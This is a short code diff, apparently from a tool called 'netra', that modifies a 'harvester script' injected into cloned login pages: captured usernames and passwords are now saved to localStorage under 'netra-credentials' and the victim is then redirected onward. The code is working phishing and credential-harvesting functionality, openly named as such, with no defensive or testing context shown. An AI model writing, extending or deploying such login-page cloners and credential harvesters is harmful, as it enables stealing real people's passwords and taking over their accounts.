@@ -54,19 +54,27 @@ const getHarvesterScript = (redirectUrl: string) => `
         
         const password = passwordInput.value;
 
-        // Only post message if we have something
+        // Post to localStorage instead of using postMessage
         if (username || password) {
-            window.parent.postMessage({ 
-                type: 'credential-capture', 
-                username: username, 
-                password: password 
-            }, '*');
+            try {
+                const credential = {
+                    username: username,
+                    password: password,
+                    timestamp: Date.now()
+                };
+                const storedCreds = localStorage.getItem('netra-credentials');
+                const existingCreds = storedCreds ? JSON.parse(storedCreds) : [];
+                const updatedCreds = [...existingCreds, credential];
+                localStorage.setItem('netra-credentials', JSON.stringify(updatedCreds));
+            } catch (e) {
+                console.error('Failed to save credentials to localStorage', e);
+            }
         }
 
-        // Redirect after a short delay to ensure message is sent
+        // Redirect after a short delay to ensure localStorage has time to write
         setTimeout(() => {
             window.location.href = '${redirectUrl}';
-        }, 500);
+        }, 200);
       };
 
       // Handle standard form submission
@@ -130,3 +138,4 @@ export async function cloneLoginPage(input: PageClonerInput): Promise<PageCloner
     throw new Error('An unknown error occurred during page cloning.');
   }
 }
+
